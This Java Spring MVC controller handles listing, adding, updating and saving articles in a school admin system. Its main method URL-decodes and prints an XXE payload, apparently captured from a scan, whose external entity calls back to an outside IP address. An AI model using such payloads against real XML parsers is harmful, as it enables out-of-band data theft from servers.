package com.project.controller.admin;

import com.project.controller.BaseController;
import com.project.model.ResultObject;
import com.project.model.school.Article;
import com.project.model.school.SchoolModel;
import com.project.model.school.Subject;
import com.project.service.admin.ArticleService;
import com.project.service.admin.SubjectService;
import com.project.service.admin.TeacherService;
import com.project.utils.DataPager;
import com.project.utils.PageData;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import java.net.URLDecoder;
import java.util.List;
@Controller
@RequestMapping("/article")
public class ArticleController extends BaseController {


    private Logger logger = LoggerFactory.getLogger(this.getClass());
    @Autowired
    private ArticleService articleService;
    @RequestMapping("/index")
    public ModelAndView teacherList(HttpServletRequest req){
        ModelAndView mv = this.getModelAndView();
        PageData pd = this.getPageData();
        DataPager dataPager= articleService.getArticleList(pd);
        mv.addObject("dataPager",dataPager);
        mv.addObject("pd",pd);
        mv.setViewName("page/article/article_list");
        return mv;
    }

    @RequestMapping("/to_add")
    public ModelAndView to_add(HttpServletRequest req){
        ModelAndView mv = this.getModelAndView();
        PageData pd = this.getPageData();
        mv.addObject("pd",pd);
        mv.setViewName("page/article/article_add");
        return mv;
    }


    @RequestMapping("/to_update")
    public ModelAndView to_update(Article art){
        ModelAndView mv = this.getModelAndView();
        PageData pd = this.getPageData();
        mv.addObject("pd",pd);
        Article resT=articleService.getArticleDetail(art);
        mv.addObject("article",resT);
        //  mv.addObject("pd",schoolModel);
        mv.setViewName("page/article/article_update");
        return mv;
    }


    @RequestMapping("/save")
    @ResponseBody
    public ResultObject save(MultipartFile thumb){
        PageData pd = this.getPageData();
        ModelAndView mv = this.getModelAndView();
        try {
            ResultObject result = articleService.saveArticle(thumb,pd);
            return result;
        }catch (Exception e){
            logger.error("保存文章异常：{}",e.getMessage());
            return ResultObject.error(null);

        }



    }

    public static void main(String[] args) {
        String decode = URLDecoder.decode("%3C%3Fxml+version=%221.0%22+encoding%3D%22utf-8%22%3F%3E%0A%3C%21DOCTYPE+root+%5B%0A%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2F101.91.62.170%3A4837%2Fwx_xxe_dbc_os_2019070503_220%3FaHR0cHM6Ly9qaWF4aWFvLmNoYW9qaWJ1eWVycy5jb20vYXBpL3d4L25vdGlmeQ%3D%3D%22%3E%5D%3E%0A%3Cfoo%3E%3Cvalue%3E&xxe%3B%3C%2Fvalue%3E%3C%2Ffoo%3E=");
        System.out.println(decode);
    }

}
